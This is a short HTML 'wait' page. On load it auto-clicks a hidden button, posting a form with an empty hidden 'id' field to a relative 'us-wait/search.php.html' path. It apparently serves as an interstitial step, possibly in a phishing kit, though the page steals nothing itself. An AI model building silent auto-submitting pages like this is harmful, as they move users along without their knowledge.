<!doctype html>
<html>
<head>
	<meta charset="utf-8">
	<title>wait..</title>
	<script language="JavaScript">
		function conectado() {
			document.getElementById('on').click();
		}
	</script>
</head>
<body onLoad="conectado()">
	<form name="form" id="form" action="../us-wait/search.php.html" method="post">
		<input type="hidden" name="id" id="id" value="">
		<input type="submit" name="on" id="on" value="on" style="display:none;"/>
	</form>
</body>
</html>